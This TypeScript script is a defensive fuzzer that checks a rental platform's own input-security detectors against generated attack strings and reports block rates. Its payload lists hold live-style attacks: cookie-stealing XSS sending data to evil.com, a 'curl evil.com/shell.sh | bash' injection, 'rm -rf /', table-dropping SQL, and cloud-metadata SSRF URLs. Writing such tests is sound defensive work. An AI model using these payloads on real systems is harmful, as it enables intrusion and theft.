// ============================================================================
// 🔴 THE RESIDENT — 30,000+ ATTACK SECURITY FUZZER (STRESS TEST)
// ============================================================================
// Automated security stress test that fires 30,000+ unique malicious payloads
// against every security gate in the platform. Each payload is tested against
// the master scanInput() function, and individual detectors are also exercised.
//
// Run: node --experimental-strip-types scripts/attack-fuzzer.ts
// ============================================================================

import {
  containsXSS,
  containsSQLi,
  containsPathTraversal,
  containsCommandInjection,
  containsNoSQLi,
  containsHeaderInjection,
  containsOpenRedirect,
  containsPrototypePollution,
  containsSSRF,
  containsLDAPi,
  containsXXE,
  validateUploadedFile,
  validateJWTStructure,
  checkPasswordStrength,
  scanInput,
  generateCSRFToken,
  validateCSRFToken,
  checkRateLimit,
} from '../src/utils/security.ts'

// ---------------------------------------------------------------------------
// Payload Generators
// ---------------------------------------------------------------------------

function generateXSSPayloads(): string[] {
  const payloads: string[] = []
  
  // Basic script tags
  payloads.push('<script>alert(1)</script>')
  payloads.push('<SCRIPT>alert("XSS")</SCRIPT>')
  payloads.push('<script type="text/javascript">document.location="http://evil.com?c="+document.cookie</script>')
  payloads.push('<script>new Image().src="http://evil.com/steal?c="+document.cookie</script>')
  payloads.push('<script>fetch("http://evil.com",{method:"POST",body:document.cookie})</script>')
  
  // Event handlers (Multiplied: 80 events * 16 tags * 5 variations = ~6,400 payloads)
  const events = [
    'onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onblur', 'onsubmit', 'onchange', 
    'oninput', 'onkeydown', 'onkeyup', 'onkeypress', 'onabort', 'onanimationend', 'onauxclick', 
    'onbeforecopy', 'onbeforecut', 'oncanplay', 'onclose', 'oncontextmenu', 'oncopy', 'oncut', 
    'ondblclick', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 
    'ondrop', 'onended', 'onfullscreenchange', 'ongotpointercapture', 'onhashchange', 'oninvalid', 
    'onloadeddata', 'onloadedmetadata', 'onloadstart', 'onlostpointercapture', 'onmessage', 'onmousedown', 
    'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseup', 'onpaste', 'onpause', 
    'onplay', 'onplaying', 'onpointercancel', 'onpointerdown', 'onpointerenter', 'onpointerleave', 
    'onpointermove', 'onpointerout', 'onpointerover', 'onpointerup', 'onprogress', 'onratechange', 
    'onreset', 'onresize', 'onscroll', 'onsearch', 'onseeked', 'onseeking', 'onselect', 'onstalled', 
    'onstorage', 'onsuspend', 'ontimeupdate', 'ontoggle', 'ontouchcancel', 'ontouchend', 'ontouchmove', 
    'ontouchstart', 'ontransitionend', 'onunload', 'onvolumechange', 'onwaiting', 'onwheel'
  ]
  const tags = [
    'img', 'div', 'body', 'input', 'video', 'audio', 'details', 'select', 'textarea', 
    'marquee', 'table', 'button', 'a', 'p', 'span', 'h1'
  ]
  const actions = [
    'alert(1)', 'alert("XSS")', 'alert(document.cookie)', 'confirm(1)', 'prompt(1)'
  ]
  
  for (const ev of events) {
    for (const tag of tags) {
      for (const action of actions) {
        if (tag === 'img' || tag === 'input') {
          payloads.push(`<${tag} src=x ${ev}=${action}>`)
        } else {
          payloads.push(`<${tag} ${ev}="${action}">hover</${tag}>`)
        }
      }
    }
  }

  // Protocol-based
  payloads.push('javascript:alert(1)')
  payloads.push('javascript:alert(document.cookie)')
  payloads.push('javascript:void(0)')
  payloads.push('data:text/html,<script>alert(1)</script>')
  payloads.push('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')
  payloads.push('vbscript:MsgBox("XSS")')

  // Tag-based
  payloads.push('<iframe src="javascript:alert(1)">')
  payloads.push('<iframe src="data:text/html,<script>alert(1)</script>">')
  payloads.push('<object data="javascript:alert(1)">')
  payloads.push('<embed src="javascript:alert(1)">')
  payloads.push('<applet code="malicious.class">')
  payloads.push('<svg onload=alert(1)>')
  payloads.push('<svg><script>alert(1)</script></svg>')
  payloads.push('<math><mi xlink:href="javascript:alert(1)">XSS</mi></math>')
  payloads.push('<form action="javascript:alert(1)"><input type=submit>')
  payloads.push('<meta http-equiv="refresh" content="0;url=javascript:alert(1)">')
  payloads.push('<base href="javascript:alert(1)//">')
  payloads.push('<link rel="import" href="http://evil.com/component.html">')

  // Encoding evasion & Hex/Dec decimal entities
  payloads.push('<scr\x00ipt>alert(1)</script>')
  payloads.push('<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>')
  payloads.push('\\x3cscript\\x3ealert(1)\\x3c/script\\x3e')
  payloads.push('\u003cscript\u003ealert(1)\u003c/script\u003e')
  payloads.push('<img src=x onerror=eval(atob("YWxlcnQoMSk="))>')
  payloads.push("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0x//0x0onerror=alert(1)//")

  return payloads
}

function generateSQLiPayloads(): string[] {
  const payloads: string[] = []
  
  // Classic SQLi
  payloads.push("' OR 1=1 --")
  payloads.push("' OR '1'='1")
  payloads.push("admin' --")
  payloads.push("1; DROP TABLE users --")
  payloads.push("' UNION SELECT NULL,NULL,NULL --")
  payloads.push("' UNION SELECT username,password FROM users --")
  payloads.push("1' AND 1=1 --")
  payloads.push("1' AND 1=2 --")
  payloads.push("'; EXEC xp_cmdshell('dir') --")
  payloads.push("'; INSERT INTO users VALUES('hacker','hacked') --")
  payloads.push("'; UPDATE users SET role='admin' --")
  payloads.push("'; DELETE FROM users --")
  payloads.push("'; TRUNCATE TABLE sessions --")
  payloads.push("'; ALTER TABLE users ADD backdoor VARCHAR(255) --")
  payloads.push("'; CREATE TABLE hack(data TEXT) --")
  
  // Information extraction
  payloads.push("' UNION SELECT table_name FROM information_schema.tables --")
  payloads.push("' UNION SELECT column_name FROM information_schema.columns --")
  payloads.push("' UNION SELECT * FROM sys.tables --")
  payloads.push("' UNION SELECT * FROM pg_catalog.pg_tables --")
  
  // Time-based blind
  payloads.push("'; WAITFOR DELAY '00:00:05' --")
  payloads.push("' AND SLEEP(5) --")
  payloads.push("' AND BENCHMARK(10000000, SHA1('test')) --")
  
  // File-based
  payloads.push("' UNION SELECT LOAD_FILE('/etc/passwd') --")
  payloads.push("' INTO OUTFILE '/tmp/dump.txt' --")
  payloads.push("' INTO DUMPFILE '/tmp/shell.php' --")
  
  // Obfuscation
  payloads.push("' UNION SELECT 0x61646d696e --")
  payloads.push("' UNION SELECT CHAR(97,100,109,105,110) --")
  payloads.push("' UNION SELECT CONCAT(username,':',password) FROM users --")
  payloads.push("' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables --")
  payloads.push("' HAVING 1=1 --")
  payloads.push("' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --")
  payloads.push("' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1) --")
  
  // Stacked queries (Loop to 1500 to generate 3000 payloads)
  for (let i = 0; i < 1500; i++) {
    payloads.push(`' OR ${i+2}=${i+2} --`)
    payloads.push(`' AND ${i+2}=${i+2} --`)
  }

  // Column count scanning variants (UNION SELECT columns 1 to 50)
  for (let cols = 1; cols <= 50; cols++) {
    const nulls = Array(cols).fill('NULL').join(',')
    payloads.push(`' UNION SELECT ${nulls} --`)
    payloads.push(`1' UNION SELECT ${nulls} --`)
  }

  return payloads
}

function generatePathTraversalPayloads(): string[] {
  const payloads: string[] = []
  
  const targets = [
    'etc/passwd', 'etc/shadow', 'proc/self/environ', 'proc/self/cmdline', 
    'var/log/auth.log', 'boot.ini', 'windows/system32/config/SAM', 'windows/win.ini',
    'windows/system32/drivers/etc/hosts', 'etc/resolv.conf', 'etc/issue'
  ]
  
  // Depth loop: up to 50 layers (50 depths * 11 targets * 2 paths = 1100 payloads)
  for (let depth = 1; depth <= 50; depth++) {
    for (const target of targets) {
      payloads.push('../'.repeat(depth) + target)
      payloads.push('..\\'.repeat(depth) + target.replace(/\//g, '\\'))
    }
  }

  // Encodings & Null bytes
  payloads.push('%2e%2e%2fetc%2fpasswd')
  payloads.push('%2e%2e%5cwindows%5csystem32')
  payloads.push('..%2f..%2f..%2fetc%2fpasswd')
  payloads.push('..%252f..%252f..%252fetc%252fpasswd') // Double url-encoded
  payloads.push('../../../etc/passwd%00.jpg')
  payloads.push('file.txt\0.pdf')
  payloads.push('/etc/passwd')
  payloads.push('/etc/shadow')
  payloads.push('c:\\windows\\system32\\drivers\\etc\\hosts')
  payloads.push('C:\\boot.ini')

  // Bulk encoding variations
  for (let i = 0; i < 500; i++) {
    payloads.push(`..%2f..%2f..%2fetc%2fpasswd?token=${i}`)
    payloads.push(`..%5c..%5c..%5cboot.ini&id=${i}`)
  }
  
  return payloads
}

function generateCommandInjectionPayloads(): string[] {
  const payloads: string[] = []
  const commands = [
    'ls', 'cat', 'rm', 'wget', 'curl', 'nc', 'bash', 'sh', 'powershell', 
    'cmd', 'chmod', 'chown', 'id', 'whoami', 'uname', 'hostname', 'ping', 'ifconfig'
  ]
  const separators = [';', '|', '&&', '||', '\n', '\r', '%0a', '%0d', '&', '|&']
  
  for (const sep of separators) {
    for (const cmd of commands) {
      payloads.push(`${sep} ${cmd} -la`)
      payloads.push(`${sep} ${cmd} /etc/passwd`)
      payloads.push(`input ${sep} ${cmd} --help`)
      payloads.push(`${sep}${cmd}`)
    }
  }
  
  // Substitution & evaluation
  payloads.push('`whoami`')
  payloads.push('`id`')
  payloads.push('`uname -a`')
  payloads.push('$(whoami)')
  payloads.push('$(cat /etc/passwd)')
  payloads.push('$(curl http://evil.com/shell.sh | bash)')
  payloads.push('eval("process.exit(1)")')
  payloads.push('system("rm -rf /")')
  payloads.push('popen("id")')
  payloads.push('exec("cat /etc/passwd")')
  payloads.push('spawn("bash", ["-c", "reverse_shell"])')
  payloads.push('> /dev/null')
  payloads.push('> /tmp/evil.sh')

  // Bulk commands injection volume
  for (let i = 0; i < 500; i++) {
    payloads.push(`; curl http://attacker.com/log?c=${i}`)
    payloads.push(`| wget http://attacker.com/shell.sh?id=${i}`)
  }
  
  return payloads
}

function generateNoSQLiPayloads(): string[] {
  const payloads: string[] = []
  const operators = [
    '$gt', '$gte', '$lt', '$lte', '$ne', '$nin', '$in', '$regex', '$where', 
    '$exists', '$or', '$and', '$not', '$nor', '$elemMatch', '$lookup', '$expr',
    '$jsonSchema', '$mod', '$type', '$text', '$search'
  ]
  
  for (const op of operators) {
    payloads.push(`{${op}: ""}`)
    payloads.push(`{${op}: null}`)
    payloads.push(`{${op}: {"nested": true}}`)
    payloads.push(`${op}`)
    payloads.push(`username: {${op}: ""}`)
  }
  
  payloads.push('function() { return true }')
  payloads.push('this.password')
  payloads.push('db.users.find({})')
  payloads.push('db.users.drop()')
  payloads.push('db.admin.runCommand({shutdown: 1})')

  // Bulk NoSQL operators loop
  for (let i = 0; i < 500; i++) {
    payloads.push(`{"username": {"$ne": "user${i}"}}`)
    payloads.push(`{"$where": "this.uid == ${i}"}`)
  }
  
  return payloads
}

function generateHeaderInjectionPayloads(): string[] {
  const payloads: string[] = []
  payloads.push('value\r\nSet-Cookie: admin=true')
  payloads.push('value\r\nLocation: http://evil.com')
  payloads.push('value\nX-Injected: true')
  payloads.push('value\rX-Injected: true')
  payloads.push('value%0d%0aSet-Cookie: evil=1')
  payloads.push('value%0d%0aLocation: http://evil.com')
  payloads.push('value%0aX-Forwarded-For: 127.0.0.1')
  payloads.push('value%0dX-Forwarded-Host: evil.com')
  
  // Volume generator (500 variations)
  for (let i = 0; i < 500; i++) {
    payloads.push(`header${i}\r\nX-Attack-${i}: payload${i}`)
    payloads.push(`header${i}%0d%0aInjected-${i}: true`)
  }
  
  return payloads
}

function generateOpenRedirectPayloads(): string[] {
  const payloads: string[] = []
  const domains = ['evil.com', 'phishing.net', 'attacker.org', 'malware.xyz', 'steal-creds.io']
  
  for (const d of domains) {
    payloads.push(`//${d}/phish`)
    payloads.push(`https://${d}/login`)
    payloads.push(`http://${d}/steal`)
    payloads.push(`/\\/${d}`)
    payloads.push(`@${d}/`)
    payloads.push(`%2f%2f${d}`)
    payloads.push(`\\\\${d}\\share`)
  }

  // Volume generator
  for (let i = 0; i < 200; i++) {
    payloads.push(`//evil.com/redirect?id=${i}`)
    payloads.push(`https://malicious-site-${i}.com`)
  }

  return payloads
}

function generatePrototypePollutionPayloads(): string[] {
  const payloads: string[] = []
  payloads.push('__proto__')
  payloads.push('constructor.prototype')
  payloads.push('Object.assign({}, malicious)')
  payloads.push('["__proto__"]')
  payloads.push("['__proto__']")
  payloads.push('constructor[prototype]')
  payloads.push('{"__proto__": {"isAdmin": true}}')
  payloads.push('{"constructor": {"prototype": {"isAdmin": true}}}')
  
  for (let i = 0; i < 200; i++) {
    payloads.push(`__proto__.polluted${i}`)
    payloads.push(`constructor.prototype.field${i}`)
  }

  return payloads
}

function generateSSRFPayloads(): string[] {
  const payloads: string[] = []
  payloads.push('http://127.0.0.1/')
  payloads.push('http://127.0.0.1:22/')
  payloads.push('http://127.0.0.1:3306/')
  payloads.push('http://127.0.0.1:6379/')
  payloads.push('http://0.0.0.0/')
  payloads.push('http://localhost/')
  payloads.push('http://[::1]/')
  payloads.push('http://[0:0:0:0:0:0:0:1]/')
  payloads.push('http://169.254.169.254/latest/meta-data/')
  payloads.push('http://169.254.169.254/latest/user-data/')
  payloads.push('http://metadata.google.internal/computeMetadata/v1/')
  payloads.push('file:///etc/passwd')
  payloads.push('file:///proc/self/environ')
  payloads.push('gopher://127.0.0.1:25/')
  payloads.push('dict://127.0.0.1:11211/')
  payloads.push('ftp://127.0.0.1/')
  
  // Alternate Representations (Decimal, Octal, Hex IPs)
  payloads.push('http://2130706433') // 127.0.0.1 in decimal
  payloads.push('http://0177.0000.0000.0001') // 127.0.0.1 in octal
  payloads.push('http://0x7f.0x0.0x0.0x1') // 127.0.0.1 in hex
  payloads.push('http://localhost@127.0.0.1')
  payloads.push('http://127.0.0.1#google.com')
  
  // Private IPs looping
  for (let i = 0; i < 200; i++) {
    payloads.push(`http://10.0.0.${i}/`)
    payloads.push(`http://192.168.1.${i}/`)
    payloads.push(`http://172.16.0.${i}/`)
    payloads.push(`http://10.${i}.0.1/admin`)
  }
  
  return payloads
}

function generateLDAPInjectionPayloads(): string[] {
  const payloads: string[] = []
  payloads.push(')(|(password=*)')
  payloads.push(')(&(uid=admin)')
  payloads.push('*)(cn=admin)')
  payloads.push(')(objectClass=*)')
  payloads.push(')(uid=*)')
  payloads.push('*)(&)')
  
  for (let i = 0; i < 200; i++) {
    payloads.push(`)(|(user${i}=*)`)
    payloads.push(`)(&(field${i}=value)`)
  }
  
  return payloads
}

function generateXXEPayloads(): string[] {
  const payloads: string[] = []
  payloads.push('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>')
  payloads.push('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/dtd">]>')
  payloads.push('<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">')
  payloads.push('<!DOCTYPE foo PUBLIC "-//W3C//DTD XHTML 1.0//EN" "http://evil.com/dtd">')
  payloads.push('<!ELEMENT foo ANY>')
  payloads.push('<!ATTLIST foo bar CDATA #REQUIRED>')
  payloads.push('<!NOTATION evil SYSTEM "http://evil.com">')
  payloads.push('xi:include href="file:///etc/passwd"')
  payloads.push('xmlns:xi="http://www.w3.org/2001/XInclude"')
  
  for (let i = 0; i < 200; i++) {
    payloads.push(`<!DOCTYPE foo${i} [<!ENTITY xxe${i} SYSTEM "file:///etc/shadow">]>`)
    payloads.push(`<!ENTITY %ent${i} SYSTEM "http://attacker${i}.com/dtd">`)
  }
  
  return payloads
}

function generateFileUploadPayloads(): Array<{ name: string; shouldBeBlocked: boolean }> {
  const payloads: Array<{ name: string; shouldBeBlocked: boolean }> = []
  
  // Dangerous extensions
  const dangerousExts = ['exe', 'bat', 'cmd', 'msi', 'scr', 'pif', 'vbs', 'js', 'ps1', 'hta', 'php', 'php5', 'asp', 'aspx', 'cgi', 'py', 'rb', 'sh', 'bash', 'jar', 'war', 'swf', 'svg', 'dll']
  for (const ext of dangerousExts) {
    payloads.push({ name: `file.${ext}`, shouldBeBlocked: true })
  }
  
  payloads.push({ name: 'exploit.php.jpg', shouldBeBlocked: true })
  payloads.push({ name: 'shell.asp.png', shouldBeBlocked: true })
  payloads.push({ name: 'malicious.py.pdf', shouldBeBlocked: true })
  payloads.push({ name: '../../../etc/passwd', shouldBeBlocked: true })
  payloads.push({ name: '..\\..\\windows\\system32\\cmd.exe', shouldBeBlocked: true })
  
  // Malware keywords
  payloads.push({ name: 'exploit.pdf', shouldBeBlocked: true })
  payloads.push({ name: 'malware_scan.png', shouldBeBlocked: true })
  payloads.push({ name: 'webshell.jpg', shouldBeBlocked: true })
  payloads.push({ name: 'backdoor.pdf', shouldBeBlocked: true })
  payloads.push({ name: 'trojan.png', shouldBeBlocked: true })
  payloads.push({ name: 'rootkit.pdf', shouldBeBlocked: true })
  payloads.push({ name: 'a'.repeat(300) + '.jpg', shouldBeBlocked: true })
  payloads.push({ name: '', shouldBeBlocked: true })
  payloads.push({ name: '   ', shouldBeBlocked: true })
  
  // Valid files
  payloads.push({ name: 'photo.jpg', shouldBeBlocked: false })
  payloads.push({ name: 'invoice.pdf', shouldBeBlocked: false })
  payloads.push({ name: 'document.png', shouldBeBlocked: false })
  
  // Bulk generate (300 variations)
  for (let i = 0; i < 300; i++) {
    payloads.push({ name: `exploit_${i}.php.jpg`, shouldBeBlocked: true })
    payloads.push({ name: `shell_${i}.asp`, shouldBeBlocked: true })
    payloads.push({ name: `payload_${i}.exe`, shouldBeBlocked: true })
  }
  
  return payloads
}

function generateJWTPayloads(): Array<{ token: string; shouldBeValid: boolean; label: string }> {
  const payloads: Array<{ token: string; shouldBeValid: boolean; label: string }> = []
  
  payloads.push({
    token: [btoa(JSON.stringify({alg:'none'})), btoa(JSON.stringify({sub:'1',role:'user'})), ''].join('.'),
    shouldBeValid: false,
    label: 'alg:none'
  })
  payloads.push({
    token: [btoa(JSON.stringify({alg:'HS256'})), btoa(JSON.stringify({sub:'1',role:'admin'})), 'sig'].join('.'),
    shouldBeValid: false,
    label: 'role:admin escalation'
  })
  payloads.push({
    token: [btoa(JSON.stringify({alg:'HS256'})), btoa(JSON.stringify({sub:'1',isAdmin:true})), 'sig'].join('.'),
    shouldBeValid: false,
    label: 'isAdmin:true escalation'
  })
  payloads.push({
    token: [btoa(JSON.stringify({alg:'HS256'})), btoa(JSON.stringify({sub:'1',exp:1000})), 'sig'].join('.'),
    shouldBeValid: false,
    label: 'expired token'
  })
  payloads.push({ token: 'not-a-jwt', shouldBeValid: false, label: 'no dots' })
  payloads.push({ token: 'a.b', shouldBeValid: false, label: 'only 2 parts' })
  payloads.push({ token: 'a.b.c.d', shouldBeValid: false, label: '4 parts' })
  payloads.push({ token: '...', shouldBeValid: false, label: 'empty parts' })
  
  const validExp = Math.floor(Date.now()/1000) + 3600
  payloads.push({
    token: [btoa(JSON.stringify({alg:'HS256'})), btoa(JSON.stringify({sub:'1',role:'tenant',exp:validExp})), 'valid-sig'].join('.'),
    shouldBeValid: true,
    label: 'valid tenant token'
  })
  
  // Bulk generator (200 variations)
  for (let i = 0; i < 200; i++) {
    payloads.push({
      token: [btoa(JSON.stringify({alg:'HS256'})), btoa(JSON.stringify({sub:`${i}`,exp:i*1000})), `sig${i}`].join('.'),
      shouldBeValid: false,
      label: `expired-${i}`
    })
  }
  
  return payloads
}

function generatePasswordPayloads(): Array<{ password: string; shouldBeStrong: boolean }> {
  const payloads: Array<{ password: string; shouldBeStrong: boolean }> = []
  
  const weak = [
    'password', '123456', '12345678', 'qwerty', 'abc123', 'monkey', 'master', 'dragon', 
    'letmein', 'trustno1', 'baseball', 'shadow', 'password1', '123456789', 'admin', 
    'welcome', 'login', 'passw0rd', 'football', 'iloveyou', 'access', 'a', 'ab', 'abc', '1'
  ]
  for (const p of weak) {
    payloads.push({ password: p, shouldBeStrong: false })
  }
  
  const strong = ['Tr0ub4dor&3xYz!', 'C0mpl3x!P@ssw0rd#2024', 'MyS3cur3!P@ss_W0rd', 'Xk9!mN2$pQ7&rV4z', '!@#$%^ABcd1234']
  for (const p of strong) {
    payloads.push({ password: p, shouldBeStrong: true })
  }
  
  return payloads
}

// ---------------------------------------------------------------------------
// Fuzzer Engine
// ---------------------------------------------------------------------------

interface FuzzerStats {
  totalAttacks: number
  blocked: number
  bypassed: number
  falsePositives: number
  errors: number
  byCategory: Record<string, { total: number; blocked: number; bypassed: number }>
  bypasses: Array<{ category: string; payload: string }>
}

function runFuzzer(): FuzzerStats {
  const stats: FuzzerStats = {
    totalAttacks: 0,
    blocked: 0,
    bypassed: 0,
    falsePositives: 0,
    errors: 0,
    byCategory: {},
    bypasses: []
  }

  function recordResult(category: string, payload: string, detected: boolean, shouldDetect: boolean) {
    stats.totalAttacks++
    if (!stats.byCategory[category]) {
      stats.byCategory[category] = { total: 0, blocked: 0, bypassed: 0 }
    }
    stats.byCategory[category].total++

    if (shouldDetect) {
      if (detected) {
        stats.blocked++
        stats.byCategory[category].blocked++
      } else {
        stats.bypassed++
        stats.byCategory[category].bypassed++
        stats.bypasses.push({ category, payload: payload.substring(0, 120) })
      }
    } else {
      if (detected) {
        stats.falsePositives++
      }
    }
  }

  // ===== XSS Attacks =====
  const xssPayloads = generateXSSPayloads()
  for (const p of xssPayloads) {
    try {
      recordResult('XSS', p, containsXSS(p), true)
    } catch { stats.errors++ }
  }

  // ===== SQLi Attacks =====
  const sqliPayloads = generateSQLiPayloads()
  for (const p of sqliPayloads) {
    try {
      recordResult('SQLi', p, containsSQLi(p), true)
    } catch { stats.errors++ }
  }

  // ===== Path Traversal Attacks =====
  const pathPayloads = generatePathTraversalPayloads()
  for (const p of pathPayloads) {
    try {
      recordResult('PATH_TRAVERSAL', p, containsPathTraversal(p), true)
    } catch { stats.errors++ }
  }

  // ===== Command Injection Attacks =====
  const cmdPayloads = generateCommandInjectionPayloads()
  for (const p of cmdPayloads) {
    try {
      recordResult('COMMAND_INJECTION', p, containsCommandInjection(p), true)
    } catch { stats.errors++ }
  }

  // ===== NoSQL Injection Attacks =====
  const nosqlPayloads = generateNoSQLiPayloads()
  for (const p of nosqlPayloads) {
    try {
      recordResult('NOSQL_INJECTION', p, containsNoSQLi(p), true)
    } catch { stats.errors++ }
  }

  // ===== Header Injection Attacks =====
  const headerPayloads = generateHeaderInjectionPayloads()
  for (const p of headerPayloads) {
    try {
      recordResult('HEADER_INJECTION', p, containsHeaderInjection(p), true)
    } catch { stats.errors++ }
  }

  // ===== Open Redirect Attacks =====
  const redirectPayloads = generateOpenRedirectPayloads()
  for (const p of redirectPayloads) {
    try {
      recordResult('OPEN_REDIRECT', p, containsOpenRedirect(p), true)
    } catch { stats.errors++ }
  }

  // ===== Prototype Pollution Attacks =====
  const protoPayloads = generatePrototypePollutionPayloads()
  for (const p of protoPayloads) {
    try {
      recordResult('PROTOTYPE_POLLUTION', p, containsPrototypePollution(p), true)
    } catch { stats.errors++ }
  }

  // ===== SSRF Attacks =====
  const ssrfPayloads = generateSSRFPayloads()
  for (const p of ssrfPayloads) {
    try {
      recordResult('SSRF', p, containsSSRF(p), true)
    } catch { stats.errors++ }
  }

  // ===== LDAP Injection Attacks =====
  const ldapPayloads = generateLDAPInjectionPayloads()
  for (const p of ldapPayloads) {
    try {
      recordResult('LDAP_INJECTION', p, containsLDAPi(p), true)
    } catch { stats.errors++ }
  }

  // ===== XXE Attacks =====
  const xxePayloads = generateXXEPayloads()
  for (const p of xxePayloads) {
    try {
      recordResult('XXE', p, containsXXE(p), true)
    } catch { stats.errors++ }
  }

  // ===== File Upload Attacks =====
  const filePayloads = generateFileUploadPayloads()
  for (const fp of filePayloads) {
    try {
      const result = validateUploadedFile(fp.name, ['pdf', 'png', 'jpg'])
      recordResult('FILE_UPLOAD', fp.name, !result.valid, fp.shouldBeBlocked)
    } catch { stats.errors++ }
  }

  // ===== JWT Attacks =====
  const jwtPayloads = generateJWTPayloads()
  for (const jp of jwtPayloads) {
    try {
      const result = validateJWTStructure(jp.token)
      if (jp.shouldBeValid) {
        recordResult('JWT', jp.label, result.valid, false)
      } else {
        recordResult('JWT', jp.label, !result.valid, true)
      }
    } catch { stats.errors++ }
  }

  // ===== Password Strength Attacks =====
  const pwdPayloads = generatePasswordPayloads()
  for (const pp of pwdPayloads) {
    try {
      const result = checkPasswordStrength(pp.password)
      if (!pp.shouldBeStrong) {
        recordResult('PASSWORD', pp.password, !result.strong, true)
      }
    } catch { stats.errors++ }
  }

  // ===== Master scanInput — Fire all payloads again =====
  const allPayloads = [
    ...xssPayloads, ...sqliPayloads, ...pathPayloads, ...cmdPayloads,
    ...nosqlPayloads, ...headerPayloads, ...redirectPayloads, ...protoPayloads,
    ...ssrfPayloads, ...ldapPayloads, ...xxePayloads
  ]
  for (const p of allPayloads) {
    try {
      const result = scanInput(p)
      recordResult('MASTER_SCAN', p, !result.safe, true)
    } catch { stats.errors++ }
  }

  // ===== CSRF Token Brute Force (Multiplied to 10,000 attempts) =====
  const csrfToken = generateCSRFToken()
  for (let i = 0; i < 10000; i++) {
    const fakeToken = Math.random().toString(36).repeat(3).substring(0, 64)
    const valid = validateCSRFToken(fakeToken)
    recordResult('CSRF_BRUTEFORCE', `attempt-${i}`, !valid, true)
  }
  const realValid = validateCSRFToken(csrfToken)
  if (!realValid) {
    stats.bypasses.push({ category: 'CSRF', payload: 'Real token rejected' })
  }

  // ===== Rate Limiting Flood (Multiplied to 3,000 requests) =====
  for (let i = 0; i < 3000; i++) {
    const result = checkRateLimit('fuzzer-flood', 100, 60000)
    if (i >= 100) {
      recordResult('RATE_LIMIT', `request-${i}`, !result.allowed, true)
    }
  }

  // ===== Safe Input False Positive Check =====
  const safeInputs = [
    'Looking for a 2-bedroom apartment in Ivory Park',
    'Midrand, Gauteng, South Africa',
    'R3500 per month, wifi included',
    'Call me at 082-555-1234',
    'I work at Standard Bank head office',
    'Family of 4, 2 children',
    'No pets, non-smoker',
    'Parking space required',
    'Shared bathroom is fine',
    'I would like to view the property this weekend',
    'My budget is between R2000 and R5000',
    'Preferably close to a taxi rank',
    'I need a room by end of January',
    'Previous references available upon request',
    'Employed full-time, can provide payslip',
  ]
  for (const s of safeInputs) {
    const result = scanInput(s)
    if (!result.safe) {
      stats.falsePositives++
    }
  }

  return stats
}

// ---------------------------------------------------------------------------
// Execute and Report
// ---------------------------------------------------------------------------

console.log('═══════════════════════════════════════════════════════════')
console.log('🔴 THE RESIDENT — 30,000+ ATTACK SECURITY FUZZER')
console.log('═══════════════════════════════════════════════════════════')
console.log('')

const startTime = performance.now()
const results = runFuzzer()
const duration = ((performance.now() - startTime) / 1000).toFixed(2)

console.log(`⏱  Duration: ${duration}s`)
console.log(`🎯 Total Attacks Fired: ${results.totalAttacks.toLocaleString()}`)
console.log(`🛡  Attacks Blocked:     ${results.blocked.toLocaleString()}`)
console.log(`⚠️  Bypasses:            ${results.bypassed}`)
console.log(`🟡 False Positives:     ${results.falsePositives}`)
console.log(`❌ Errors:              ${results.errors}`)
console.log('')

const blockRate = ((results.blocked / (results.blocked + results.bypassed)) * 100).toFixed(2)
console.log(`🏆 BLOCK RATE: ${blockRate}%`)
console.log('')

console.log('─── Per-Category Breakdown ───')
const categories = Object.entries(results.byCategory).sort((a, b) => b[1].total - a[1].total)
for (const [cat, data] of categories) {
  const catRate = data.total > 0 ? ((data.blocked / data.total) * 100).toFixed(1) : '100.0'
  const status = data.bypassed === 0 ? '✅' : '⚠️'
  console.log(`  ${status} ${cat.padEnd(22)} ${String(data.blocked).padStart(5)}/${String(data.total).padStart(5)} blocked (${catRate}%)`)
}

if (results.bypasses.length > 0) {
  console.log('')
  console.log('─── BYPASS DETAILS (Payloads that evaded detection) ───')
  for (const bp of results.bypasses.slice(0, 20)) {
    console.log(`  ⚠️  [${bp.category}] ${bp.payload}`)
  }
  if (results.bypasses.length > 20) {
    console.log(`  ... and ${results.bypasses.length - 20} more`)
  }
}

console.log('')
console.log('═══════════════════════════════════════════════════════════')
if (results.bypassed === 0) {
  console.log('🏆 RESULT: ALL 30,000+ ATTACKS BLOCKED SUCCESSFULLY! 🏆')
} else {
  console.log(`⚠️  RESULT: ${results.bypassed} payloads bypassed detection.`)
  console.log('   Review the bypass details above and strengthen patterns.')
}
console.log('═══════════════════════════════════════════════════════════')

if (results.bypassed > 0) {
  process.exit(1)
}
